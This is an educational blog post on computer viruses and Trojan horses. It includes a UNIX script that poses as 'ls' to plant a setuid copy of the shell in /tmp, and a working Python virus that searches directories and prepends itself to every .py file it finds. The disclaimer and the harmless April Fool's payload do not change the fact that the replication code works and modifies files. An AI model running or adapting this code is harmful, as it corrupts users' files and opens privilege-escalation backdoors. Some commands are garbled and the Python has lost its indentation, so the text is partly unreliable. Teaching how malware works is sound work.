Viruses – From Newbie to pro



 _NOTE: Using an online compiler is not going to work here. Please install
Python 2.7x and cv2, argparse modules to actually try out this example._

Heya friends! Welcome back! Before continuing on with Malicious Logic, I
request you to have a look at this great and informative article Worms,
Viruses and Beyond!!

Now, this article will focus more on applications than theory of computer
viruses, worms, and Trojan horses.

 _But, please note that this article is meant to be used for educational
purposes only. **I, in no way, promote the usage of viruses, worms, or trojan
horses to attack computer systems and causing damage.**_

Malicious logic is a set of instructions (basically a program) that causes the
violation of a security policy of a website/program/application, etc.

  

  

 **UNIX Script**

    
    
        cp /bin/sh /tmp/.xxsh
        chmod u+s,o+x /tmp/.xxsh
        rm ./ls
        ls $*
    

In this example, we are assuming that “.” is in the path environment and the
script has been named ls and is placed in the directory.

 **Analysing the script**

This script creates a copy of the UNIX Shell that is setuid of the user
executing this program. To understand setuid programs, we first need to
understand how User Identity is stored in a UNIX OS.

In UNIX OS, user identity is usually represented as an integer between 0 and
generally, 65,535. This number is also referred to as UID (Unique
Identification Number). Now, what setuid programs do is that they create
processes with UID of the owner and not of a third person executing the
program. This means, that an executor will have the rights of the owner… This
in itself is a possible vulnerability.

Coming back to our script, so a setuid copy of the UNIX shell was created.
Later on, this program is deleted, and then the correct ls command (for
listing the files and folders present in the current working directory) is
executed.

 **Trojan Horses**

Go back to the previous script… Suppose if someone (root) typed:

  

  

    
    
        cp /bin/sh /tmp/.xxsh
        chmod o+s,w+x /tmp.xxsh
    

If the script was typed deliberately, then it will result in a Trojan Horse.

 **Virus – A basic format**

Most of the computer viruses follow the following basic script:

    
    
    Beginvirus
    if spread-condition TRUE then begin
        for the target files begin
           if target affected TRUE then begin
              Determine where to place virus instructions
              Copy the virus instructions
              Modify target to spread the virus later
           End if
        End for
    End if
    Perform some other instruction(s) //Optional
    Go back to beginning
    Endvirus
    

Basically, every computer virus has two phases –

  1. Insertion phase – in this phase, the virus inserts itself into the target.
  2. Execution phase- in this phase, the virus performs some actions.

Let’s take a look at a real virus in Python. Now this is not an actual virus
which will cause corruption files, deletion of system files, etc. **but just a
simple harmless virus.**

 __

 __  
 __

 __

 __  
 __  
 __

#!/usr/bin/python

import os, datetime, inspect 

DATA_TO_INSERT = "GEEKSFORGEEKS"

 

#search for target files in path

def search(path): 

 filestoinfect = [] 

 filelist = os.listdir(path) 

 for filename in filelist: 

 

 #If it is a folder

 if os.path.isdir(path+"/"+filename): 

 filestoinfect.extend(search(path+"/"+filename)) 

 

 #If it is a python script -> Infect it 

 elif filename[-3:] == ".py":

 

 #default value

 infected = False

 for line in open(path+"/"+filename): 

 if DATA_TO_INSERT in line: 

 infected = True

 break

 if infected == False: 

 filestoinfect.append(path+"/"+filename) 

 return filestoinfect 

 

#changes to be made in the target file 

def infect(filestoinfect): 

 target_file = inspect.currentframe().f_code.co_filename 

 virus = open(os.path.abspath(target_file)) 

 virusstring = "" 

 for i,line in enumerate(virus): 

 if i>=0 and i <41: 

 virusstring += line 

 virus.close 

 for fname in filestoinfect: 

 f = open(fname) 

 temp = f.read() 

 f.close() 

 f = open(fname,"w") 

 f.write(virusstring + temp) 

 f.close() 

 

#Not required actually 

def explode(): 

 if datetime.datetime.now().month == 4 and
datetime.datetime.now().day == 1: 

 print ("HAPPY APRIL FOOL'S DAY!!")

filestoinfect = search(os.path.abspath("")) 

infect(filestoinfect) 

explode()   
  
---  
  
__

__

Now, this is quite a safe virus But, the basic format and working is the same.

Also, there are various types of computer virus – Boot sector infectors,
executable infectors, multipartite virus, TSR virus, Stealth virus, Encrypted
virus, polymorphic virus, macro virus.

Now, I won’t go into the details and will just stop here. That’s all from my
side!

 **About the author:**

 **Vishwesh Shrimali** is an Undergraduate Mechanical Engineering student at
BITS Pilani. He fulfils![vish](http://d1gjlxt8vb0knt.cloudfront.net//wp-
content/uploads/vish-100x100.png) about all the requirements not taught in his
branch- white hat hacker, network security operator, and an ex – Competitive
Programmer. As a firm believer in power of Python, his majority work has been
in the same language. Whenever he get some time apart from programming,
attending classes, watching CSI Cyber, he go for a long walk and play guitar
in silence. His motto of life is – “Enjoy your life, ‘cause it’s worth
enjoying!”

 **If you also wish to showcase your blog here, please seeGBlog for guest blog
writing on GeeksforGeeks.**

![Try out the all-new GeeksforGeeks
Premium!](https://media.geeksforgeeks.org/wp-content/cdn-
uploads/20210304125233/GFG-Go-Premium.png)

My Personal Notes _arrow_drop_up_

Save

